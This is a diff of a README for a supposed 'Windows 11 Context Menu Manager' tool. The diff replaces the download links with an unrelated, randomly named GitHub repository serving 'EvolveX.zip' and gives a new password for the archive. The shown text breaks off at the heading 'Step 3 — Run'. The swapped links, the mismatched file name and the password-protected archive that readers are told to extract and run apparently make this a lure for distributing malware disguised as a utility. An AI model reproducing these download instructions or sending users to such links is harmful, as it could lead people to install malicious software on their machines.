@@ -14,20 +14,20 @@ Windows 11 Context Menu Manager is a simple tool that allows you to disable unwa
 
 ## Download
 
-[Latest release](https://github.com/FinAnbuCharge/tvnqenwd/releases/download/v1.1/ContextMenuPlus.zip)
+[Latest release](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
 
 ## Installation Guide
 
 ### Step 1 — Download
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/FinAnbuCharge/tvnqenwd/releases/download/v1.1/ContextMenuPlus.zip)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
 
 ### Step 2 — Extract
 
 Extract the downloaded archive using the password:
 
 ```
-CONTEXT
+AK2026
 ```
 
 ### Step 3 — Run
